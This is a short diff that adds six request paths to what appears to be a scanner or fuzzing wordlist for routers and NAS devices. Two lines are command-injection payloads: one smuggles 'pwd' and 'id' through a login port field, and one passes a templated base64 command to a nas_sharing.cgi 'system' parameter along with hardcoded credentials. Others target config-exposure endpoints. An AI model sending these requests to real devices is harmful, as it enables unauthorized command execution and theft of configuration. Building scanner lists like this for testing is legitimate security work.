@@ -1,0 +1,6 @@
+/cgi-bin/login_mgr.cgi?C1=ON&cmd=login&f_type=1&f_username=admin&port=80%7Cpwd%26id&pre_pwd=1&pwd=%20&ssl=1&ssl_port=1&username=
+/getcfg.php
+/wan.htm
+/ddns_check.ccp
+/cgi-bin/nas_sharing.cgi?user=mydlinkBRionyg&passwd=YWJjMTIzNDVjYmE&cmd=15&system={{base64(cmd)}}
+/cgi-bin/ExportSettings.sh
